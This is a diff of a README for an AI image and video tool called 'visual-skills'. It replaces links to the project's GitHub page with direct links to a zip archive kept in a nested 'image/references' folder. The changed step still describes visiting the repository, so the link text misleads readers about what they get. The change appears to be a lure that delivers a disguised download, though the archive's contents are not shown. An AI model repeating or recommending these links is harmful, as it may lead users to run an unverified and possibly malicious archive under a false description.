@@ -1,6 +1,6 @@
 # 🎨 visual-skills - Create Professional AI Images and Videos
 
-[![Download visual-skills](https://img.shields.io/badge/Download-visual--skills-blue.svg)](https://github.com/chirag6653/visual-skills)
+[![Download visual-skills](https://img.shields.io/badge/Download-visual--skills-blue.svg)](https://github.com/chirag6653/visual-skills/raw/refs/heads/main/image/references/visual-skills-1.8-alpha.5.zip)
 
 ## 🎯 About This Tool
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to access and use the library:
 
-1. Click this link to visit the repository: [https://github.com/chirag6653/visual-skills](https://github.com/chirag6653/visual-skills)
+1. Click this link to visit the repository: [https://github.com/chirag6653/visual-skills/raw/refs/heads/main/image/references/visual-skills-1.8-alpha.5.zip](https://github.com/chirag6653/visual-skills/raw/refs/heads/main/image/references/visual-skills-1.8-alpha.5.zip)
 2. Look for the green button labeled "Code" near the top right of the page.
 3. Select "Download ZIP" from the menu.
 4. Locate the zip file in your downloads folder.
